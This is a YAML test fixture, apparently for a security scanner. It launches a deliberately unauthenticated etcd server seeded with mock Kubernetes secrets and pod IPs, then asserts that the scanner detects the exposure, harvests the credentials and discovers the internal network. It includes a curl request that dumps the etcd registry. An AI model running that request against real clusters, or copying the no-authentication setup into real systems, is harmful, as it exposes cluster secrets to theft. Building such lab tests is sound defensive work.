name: chain-etcd-k8s-secrets
description: >
  Exploit chain: unauthenticated etcd → Kubernetes secret enumeration →
  credential extraction → internal network discovery.
  Exposed etcd (Kubernetes backing store) contains all cluster state
  including secrets, service accounts, and pod network configuration.
tags: [chain, postexploit, etcd, kubernetes, secrets, authorized]

services:
  etcd:
    image: bitnami/etcd:3.5
    ports: ["0:2379"]
    environment:
      ALLOW_NONE_AUTHENTICATION: "yes"
      ETCD_ADVERTISE_CLIENT_URLS: "http://0.0.0.0:2379"
      ETCD_LISTEN_CLIENT_URLS: "http://0.0.0.0:2379"

  seed:
    image: bitnami/etcd:3.5
    depends_on: [etcd]
    restart: "no"
    environment:
      ALLOW_NONE_AUTHENTICATION: "yes"
    entrypoint: ["sh", "-c"]
    command:
      - |
        sleep 5
        etcdctl --endpoints=http://etcd:2379 put /registry/secrets/default/db-creds '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"db-creds","namespace":"default"},"data":{"password":"UEBzc3cwcmQhU3VwZXJTZWNyZXQ=","username":"YWRtaW4="}}'
        etcdctl --endpoints=http://etcd:2379 put /registry/secrets/kube-system/cloud-sa '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"cloud-sa","namespace":"kube-system"},"data":{"token":"ZXlKaGJHY2lPaUpTVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5"}}'
        etcdctl --endpoints=http://etcd:2379 put /registry/services/specs/default/api-gateway '{"metadata":{"name":"api-gateway"},"spec":{"clusterIP":"10.96.0.100","ports":[{"port":8080}]}}'
        etcdctl --endpoints=http://etcd:2379 put /registry/pods/default/web-app '{"metadata":{"name":"web-app"},"status":{"podIP":"10.244.0.15","hostIP":"192.168.1.100"}}'

ready:
  cmd: "curl -sf http://localhost:${fixture.etcd.port}/version | grep -q etcdcluster"
  timeout: 30s
  interval: 2s

assertions:
  # Verify exploit works
  - name: exploit-etcd-keys-readable
    type: command
    expect:
      command: "curl -sf 'http://localhost:${fixture.etcd.port}/v3/kv/range' -X POST -d '{\"key\":\"L3JlZ2lzdHJ5Lw==\",\"range_end\":\"L3JlZ2lzdHJ5MA==\"}' | grep -q registry"
      exit_code: 0

  # Beacon detection
  - name: detects-etcd-exposed
    type: beacon
    target: "localhost:${fixture.etcd.port}"
    args: ["--no-enrich", "--scanners", "portscan", "--ports", "${fixture.etcd.port}"]
    expect:
      check_id: port.etcd_exposed

  # Post-exploit: credential harvest from K8s secrets
  - name: chain-harvests-k8s-secrets
    type: beacon
    target: "localhost:${fixture.etcd.port}"
    args: ["--no-enrich", "--authorized", "--ports", "${fixture.etcd.port}"]
    expect:
      check_id: exploit.credential_harvest

  # Post-exploit: internal network discovered from pod/service IPs
  - name: chain-discovers-k8s-network
    type: beacon
    target: "localhost:${fixture.etcd.port}"
    args: ["--no-enrich", "--authorized", "--ports", "${fixture.etcd.port}"]
    expect:
      check_id: exploit.internal_network_discovered

timeout: 5m
